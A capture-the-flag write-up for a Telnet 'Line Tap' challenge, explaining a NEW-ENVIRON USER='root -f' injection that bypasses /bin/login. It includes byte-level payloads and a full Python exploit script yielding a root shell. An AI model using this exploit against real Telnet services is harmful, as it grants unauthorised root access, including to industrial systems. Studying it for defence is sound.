# Line Tap

| Field | Details |
|-------|---------|
| **Challenge** | Line Tap |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | Hardware / ICS |
| **Flag** | `HTB{r7u_l1n3_74p_5n4p5h07_ea905897752d505be8589d086eeffbfd}` |

---

## Overview

A single TCP port speaks Telnet. The lore frames it as a tap on an ICS serial
line: a serial-to-TCP gateway bridging Modbus RTU traffic. The Telnet daemon
on the other end runs `/bin/login` as the authentication gate, giving the
impression that you need credentials to proceed.

The path to the flag is a single exploit step:

**Telnet `NEW-ENVIRON` argument injection**: pass `USER="root -f"` during IAC
subnegotiation. The space causes `telnetd` to invoke `/bin/login root -f`,
where `-f` is `login`'s force-login flag, bypassing the password check entirely.

---

## Reconnaissance

Connecting with a raw `nc` gives a Telnet banner: no login prompt appears
until the IAC negotiation completes. The server sends:

```
ff fd 18  DO TTYPE
ff fd 20  DO TERMINAL-SPEED
ff fd 23  DO X-DISPLAY-LOCATION
ff fd 27  DO NEW-ENVIRON
ff fd 24  DO OLD-ENVIRON
```

Option `0x20` (TERMINAL-SPEED) is the standard baud-rate negotiation for
serial-to-TCP gateways (RFC 1079). Option `0x27` (`NEW-ENVIRON`, RFC 1572) is
the one that matters.

---

## Vulnerability

### RFC 1572 NEW-ENVIRON

The Telnet `NEW-ENVIRON` option lets the client send environment variables to
the server via subnegotiation:

```
IAC SB NEW-ENVIRON IS VAR <name> VALUE <value> IAC SE
```

`telnetd` collects these variables and passes them to `/bin/login`. On systems
where `login` is called via `execl` / `execlp` with user-supplied strings (or
via `sh -c`), the `USER` variable value lands in the command line.

### Argument Injection via Space

When `USER` is set to `"root -f"`, `telnetd` constructs a call equivalent to:

```
/bin/login root -f
```

The space causes `-f` to be interpreted as a **separate argument** to `login`,
not part of the username. The `-f` flag (`--skip-auth`) instructs `/bin/login`
to skip password verification and log in the named user directly.

This is a variant of CVE-2007-0882 (Solaris `in.telnetd` NEW-ENVIRON USER
injection), reproduced here on a Linux telnetd.

---

## Exploit

### IAC Negotiation Flow

The exchange has three rounds:

**R1: Server offers options** (arrives ~10-12 s after connect):
```
ff fd 18 fd 20 fd 23 fd 27 fd 24
```
Respond with WILL TTYPE / WILL TERMINAL-SPEED / WONT X-DISPLAY / WILL NEW-ENVIRON / WONT OLD-ENVIRON.

**R2: Server requests subneg** (arrives after R1 response):
The server sends `SB TTYPE SEND` / `SB TERMINAL-SPEED SEND` / `SB NEW-ENVIRON SEND` requests.
Send subneg responses: the key payload is in `NEW-ENVIRON IS`:

```
ff fa 27 00          # IAC SB NEW-ENVIRON IS
  00                 # VAR type
  55 53 45 52        # "USER"
  01                 # VALUE type
  72 6f 6f 74 20 2d 66  # "root -f"  ← the injection
ff f0                # IAC SE
```

**R3: Server sends standard options** (arrives after subneg):
```
ff fb 03  WILL SGA
ff fd 01  DO ECHO
ff fd 22  DO LINEMODE
ff fd 1f  DO NAWS
ff fb 05  WILL STATUS
ff fd 21  DO (option 0x21)
```

**These R3 responses are required.** Without them the bypass fires, but the
shell's output is suppressed: the session sits silent indefinitely. Respond
with: DO SGA, WILL ECHO, WONT LINEMODE, WILL NAWS + NAWS SB (80×24), DO
STATUS, WONT opt33.

After R3, the server delivers the Ubuntu welcome banner and a root shell prompt.

### Full Exploit Script

```python
import socket, time

HOST, PORT = "<ip>", <port>

def recv_all(s, t=5):
    s.settimeout(t); d = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            d += c
    except Exception:
        pass
    return d

s = socket.socket()
s.connect((HOST, PORT))
recv_all(s, 12)   # wait for R1: server delays ~10-12 s

# R1 response: WILL TTYPE, WILL TERMINAL-SPEED, WONT X-DISPLAY, WILL NEW-ENVIRON, WONT OLD-ENVIRON
s.send(
    b'\xff\xfb\x18'   # WILL TTYPE
    b'\xff\xfb\x20'   # WILL TERMINAL-SPEED
    b'\xff\xfc\x23'   # WONT X-DISPLAY-LOCATION
    b'\xff\xfb\x27'   # WILL NEW-ENVIRON
    b'\xff\xfc\x24'   # WONT OLD-ENVIRON
)
recv_all(s, 8)    # R2: server sends SB requests

# Subneg responses: the space in "root -f" is the injection
s.send(
    b'\xff\xfa\x18\x00xterm\xff\xf0'             # SB TTYPE IS xterm
    b'\xff\xfa\x20\x009600,9600\xff\xf0'          # SB TERMINAL-SPEED IS 9600,9600
    b'\xff\xfa\x27\x00'                           # SB NEW-ENVIRON IS
        b'\x00USER\x01root -f'                    #   VAR "USER" VALUE "root -f"
    b'\xff\xf0'
)
recv_all(s, 5)    # R3: server sends WILL SGA, DO ECHO, etc.

# R3 response: required or the shell prompt never appears
s.send(
    b'\xff\xfd\x03'                               # DO SGA
    b'\xff\xfb\x01'                               # WILL ECHO
    b'\xff\xfc\x22'                               # WONT LINEMODE
    b'\xff\xfb\x1f'                               # WILL NAWS
    b'\xff\xfa\x1f\x00\x50\x00\x18\xff\xf0'      # SB NAWS: 80 cols × 24 rows
    b'\xff\xfd\x05'                               # DO STATUS
    b'\xff\xfc\x21'                               # WONT (opt 0x21)
)
recv_all(s, 15)   # Ubuntu banner + root prompt

s.send(b'cat /flag.txt\r\n')
print(recv_all(s, 10).decode(errors='replace'))
# HTB{r7u_l1n3_74p_5n4p5h07_ea905897752d505be8589d086eeffbfd}
```

---

## Dead Ends Explored

**Binary mode passthrough (`WILL BINARY` / `DO BINARY`, option 0x00)**: the
idea was that the serial-to-TCP gateway might relay raw Modbus RTU frames in
binary mode. After sending BINARY subneg the session went completely silent for
five minutes. Root cause (discovered later): binary mode was a distraction; the
silence was because R3 options were never responded to, so the bypassed shell
was waiting with no visible prompt.

**OLD-ENVIRON (option 0x24)**: sending the USER injection via OLD-ENVIRON
subneg instead of NEW-ENVIRON produced no bypass. The server only acts on
the NEW-ENVIRON (0x27) value.

**Modbus RTU / TCP frames**: sent read-coil and read-holding-register requests
directly on the Telnet socket. No response from the daemon.

**AT modem commands**: no response.

**Password guessing**: `root/root`, `root/(blank)`, `root/toor`, common PLC
defaults. All returned "Login incorrect."

**Passive listening**: waited several minutes at various negotiation states for
unsolicited Modbus traffic. The gateway sends nothing unprompted.

---

## Takeaways

**Telnet NEW-ENVIRON USER injection is decades old, and still deployed.** The
CVE-2007-0882 family of bugs showed that `telnetd` passing `USER` to `login` via
a shell-style argument string is inherently unsafe. The fix is to invoke `login`
with a proper `execv` array. Any Telnet service that prompts for a username is
worth testing with `USER="root -f"` and `USER="-f root"` before trying passwords.

**Respond to every IAC option the server sends.** A missing or wrong response to
even one option can leave the negotiation in a limbo where the server has
allocated a pty and started a shell but holds back all output, waiting for the
client to finish negotiating. Treat R3 silence as "negotiation incomplete," not
"bypass failed."

**TERMINAL-SPEED 9600,9600 signals a serial bridge.** When a Telnet daemon
requests baud-rate negotiation, the underlying service is almost certainly a
serial device. This narrows the protocol space (Modbus RTU, DNP3, IEC 101) and
indicates you are one TCP-serial adapter away from physical field devices.

**The ICS misdirection was real.** The challenge title, lore, and Modbus option
negotiation were designed to send solvers into industrial-protocol rabbit holes.
The actual vulnerability was in the Telnet layer, not the ICS payload.
